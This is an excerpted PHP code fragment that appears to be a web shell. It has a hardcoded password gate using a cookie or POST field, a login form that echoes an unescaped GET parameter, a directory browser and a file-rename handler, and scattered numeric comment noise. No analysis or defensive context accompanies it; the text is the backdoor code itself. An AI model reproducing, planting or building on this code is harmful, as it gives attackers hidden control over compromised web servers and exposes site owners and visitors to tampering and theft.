...
$auth_key = "2ca1e5131ea461995cc9a5ad522332b9";
...
$pass = false;
if (isset($_COOKIE['pw_name_75472'])) {
    if(($_COOKIE['pw_name_75472']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_75472'])) {
        if(($_POST['pw_name_75472']) == $auth_key) {
            setcookie("pw_name_75472", $_POST['pw_name_75472']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_75472' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721092038106289 1721092038330714 1721092038487026 1721092038877579
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721092038106289 1721092038330714 1721092038487026 1721092038877579
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721092038106289 1721092038330714 1721092038487026 1721092038877579
            $name = PATH . "/" . $_GET['r'];
